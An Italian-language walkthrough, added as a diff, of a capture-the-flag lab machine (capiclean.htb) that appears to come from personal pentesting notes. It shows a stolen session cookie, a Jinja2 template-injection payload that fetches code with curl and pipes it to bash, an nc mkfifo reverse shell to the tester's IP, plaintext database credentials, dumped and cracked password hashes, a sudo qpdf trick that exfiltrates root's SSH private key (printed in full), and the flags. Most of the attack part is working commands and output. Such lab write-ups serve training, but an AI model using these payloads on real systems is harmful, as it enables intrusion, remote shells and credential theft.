@@ -1,0 +1,165 @@
+una volta ottenuto il SESSION_ID
+
+┌──(antonio㉿kali)-[~/all/pentesting/iclean/scripts]
+└─$ bash listen_on_port.bash 8081
+listening on [any] 8081 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.10.11.12] 44896
+GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zkwcjg.ntKJ4zBLCtRSaeea-V5fijKrS_Q HTTP/1.1
+Host: 10.10.14.35:8081
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://127.0.0.1:3000
+Referer: http://127.0.0.1:3000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+analiziamo la pagina, andiamo nella sezione "memoria/storage"
+e creiamo un nuovo Cookie:
+name: session
+value: eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zkwcjg.ntKJ4zBLCtRSaeea-V5fijKrS_Q
+domain: capiclean.htb
+path: /
+
+il resto va bene uguale
+
+con questo cookie abbiamo sbloccato la pagina: http://capiclean.htb/dashboard
+
+generiamo un invoice a caso
+
+otteniamo un InvoiceID, nel mio caso: 2500994779
+
+a questo punto possiamo generare il QR nella pagina: http://capiclean.htb/QRGenerator e inserendo l'IncoiceId
+
+QR Code Link: http://capiclean.htb/static/qr_code/qr_code_2500994779.png
+http://capiclean.htb/static/qr_code/qr_code_2500994779.png
+
+ora attiviamo di nuovo Burp suite e clicchiamo sul pulsante "submit"
+
+una volta intercettato possiamo inviare il secondo xss nell'attributi qr-link
+
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
+
+andiamo in https://www.revshells.com/ e otteniamo uno script "nc mkfifo" per ottenere una reverse shell, in questo caso, su porta 8082
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.35 8082 >/tmp/f
+
+url encoded:
+
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.35%208082%20%3E%2Ftmp%2Ff
+
+il nuovo XSS diventa:
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.35%208082%20%3E%2Ftmp%2Ff")|attr("read")()}}
+
+ora mettiamoci in ascolto sulla porta 8082
+
+possiamo usare uno script python per passare da sh a bash
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ora abbiamo una bella bash
+
+leggendo il sorgente del codice troviamo le credeniali per il database in chiaro
+
+# Database Configuration
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+
+logghiamo con il comando "mysql"
+
+siamo nel database
+
++--------------------+
+| Database           |
++--------------------+
+| capiclean          |
+| information_schema |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql> use capiclean
+use capiclean
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++---------------------+
+| Tables_in_capiclean |
++---------------------+
+| quote_requests      |
+| services            |
+| users               |
++---------------------+
+3 rows in set (0.00 sec)
+
+mysql> SELECT * FROM users
+SELECT * FROM users
+    -> ;
+;
++----+----------+------------------------------------------------------------------+----------------------------------+
+| id | username | password                                                         | role_id                          |
++----+----------+------------------------------------------------------------------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------------------------------------------------------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+
+noice
+
+ora cerco di crackare le password:
+vado su https://crackstation.net/
+
+admin: not found
+consuela:simple and clean
+
+perfetto, loggo come consuela
+loggato, ora la bash è molto più bella
+
+nel file user.txt presenti nella home di consuela, troviamo: 67a9fc3bdf710c760a5e0ce370ea6398
+
+cominciamo con la qpdf priviledgr escalation
+aggiungiamo root agli utenti di ssh e copiamoci il certificato
+
+sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf --add-attachment /root/.ssh/id_rsa --
+
+ci leggiamo il certificato dal file /tmp/rsa.txt
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
+1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
+vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
+dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
+JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
+EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
+AgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+
+ci colleghiamo tramite ssh con il certificato ottenuto:
+chmod 600 id_rsa_root
+ssh -i id_rsa_root root@10.10.11.12
+
+ottenuto il permesso di root, leggiamo la flag contenuta in user.txt:
+917267a509ed42c69a76134a0d0cb5df
+
+
+siamo i più forti
+
+
+
+
+
+
+
+
+
+
+
+
